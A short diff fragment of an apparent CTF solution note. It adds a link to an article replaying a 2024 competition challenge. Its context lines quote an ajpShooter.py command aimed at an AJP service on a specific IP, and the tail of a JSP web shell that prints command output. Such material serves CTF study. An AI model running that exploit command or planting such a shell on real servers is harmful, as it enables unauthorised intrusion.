@@ -23,3 +23,6 @@ python3 ajpShooter.py http://39.99.243.178:8080 8009 /upload/449aeddf75375deb7ab
     out.print("</pre>");
 %>
 ```
+
+# Article
+[绕过 | POST | [CTF复现计划]2024数字中国人才积分赛初赛 AA8](https://mp.weixin.qq.com/s/bgeq5bYOKas4-ES4XcLiSA)
